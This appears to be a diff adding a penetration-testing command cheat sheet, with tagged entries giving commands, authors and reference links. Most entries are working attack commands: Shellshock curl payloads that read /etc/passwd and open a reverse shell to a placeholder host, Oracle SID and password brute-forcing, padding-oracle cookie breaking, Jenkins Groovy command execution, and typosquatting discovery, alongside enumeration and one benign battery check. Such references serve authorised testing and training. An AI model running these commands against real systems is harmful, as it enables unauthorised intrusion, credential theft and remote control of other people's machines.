@@ -1,0 +1,120 @@
+mount -t nfs 10.0.0.2:/their/share /mnt/yourfolder -o nolock
+Mount a NFS share (check for root squash)
+BaffledJimmy
+EOC
+nfs
+fileshare
+EOT
+https://www.centos.org/docs//4/4.5/Reference_Guide/s2-nfs-client-config-options.html
+EOR
+curl -k https://[ip]/path/to/cgi/folder- bin/name_of_vuln_cgi.cgi -H "custom:() { ignored; }; echo Content- Type: text/html; echo ; /bin/cat /etc/passwd "
+Curl exploit shellshock
+rebootuser
+EOC
+shellshock
+web application
+EOT
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+EOR
+/path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP]
+Used to guess common SIDs in Oracle databases
+https://github.com/quentinhardy
+EOC
+brute
+Oracle
+database
+EOT
+https://github.com/quentinhardy/odat
+https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
+http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
+EOR
+/path/to/odat/odat-libc2.5-x86_64 passwordguesser -d [SID] -s [IP]
+Used to brute common passwords in Oracle TNS listener
+https://github.com/quentinhardy
+EOC
+brute
+Oracle
+database
+EOT
+https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
+http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
+EOR
+ping6 -c1 -I < [Interface] ff02::1 | tee ipv6-hosts
+Piped to tee for later manipulation
+Linux
+EOC
+enumeration
+ipv6
+EOT
+https://superuser.com/questions/840767/ipv6-multicast-address-for-all-nodes-on-network
+EOR
+udp-proto-scanner.pl -f [FileOfIP]
+Quick and dirty UDP service discovery
+http://labs.portcullis.co.uk/application/udp-proto-scanner
+EOC
+perl
+snmp
+EOT
+http://labs.portcullis.co.uk/application/udp-proto-scanner
+EOR
+snmpget udp6:[ipv6 address] [OID]
+SNMPGet supports ipv6
+BaffledJimmy
+EOC
+ipv6
+snmp
+EOT
+https://serverfault.com/questions/305448/snmpget-over-ipv6
+EOR
+curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
+Use -k switch to force curl to bypass any SSL warnings
+BaffledJimmy
+EOC
+shellshock
+curl
+EOT
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+EOR
+padbuster [url] [EncodedData] 8 --cookies '[UserCookies]'  -encoding 0 --plaintext user=[TextToEncode]
+Padding Oracle attack, break encrypted cookies
+Innes
+EOC
+Cookies
+web application
+EOT
+https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html
+https://archive.org/details/TheWebApplicationHackerHandbook
+https://pentesterlab.com/exercises/padding_oracle/course
+EOR
+upower -i $(upower -e | grep 'BAT') | grep -E "state|to\ full|percentage"
+Check battery level
+Innes
+EOC
+linux
+EOT
+https://askubuntu.com/questions/69556/how-to-check-battery-status-using-terminal
+EOR
+def process = "ls -l".execute();println "Found text ${process.text}"
+Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.
+Innes
+EOC
+Web Application
+Groovy
+Windows
+Linux
+code execution
+EOT
+https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/
+https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/
+https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
+EOR
+urlcrazy [domain]
+Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, and corporate espionage.
+Innes
+EOC
+web application
+dns
+recon
+EOT
+https://www.morningstarsecurity.com/research/urlcrazy
+EOR
